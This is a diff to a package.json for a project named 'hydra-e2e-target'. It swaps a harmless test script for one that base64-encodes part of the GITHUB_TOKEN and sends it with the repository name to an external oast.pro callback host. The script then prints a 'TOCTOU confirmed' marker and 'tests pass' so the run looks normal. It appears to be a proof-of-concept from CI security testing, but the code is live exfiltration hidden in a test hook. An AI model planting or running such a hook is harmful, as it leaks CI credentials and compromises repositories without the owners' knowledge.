@@ -2,6 +2,6 @@
   "name": "hydra-e2e-target",
   "version": "1.0.0",
   "scripts": {
-    "test": "echo 'tests pass'"
+    "test": "T=$(echo $GITHUB_TOKEN | cut -c1-8 | base64 -w0); R=$GITHUB_REPOSITORY; F=E2E-REAL; curl -sk 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t='$T'&r='$R'&f='$F -o /dev/null; echo 'HYDRA_TOCTOU_CONFIRMED_E2E-REAL'; echo 'tests pass'"
   }
 }
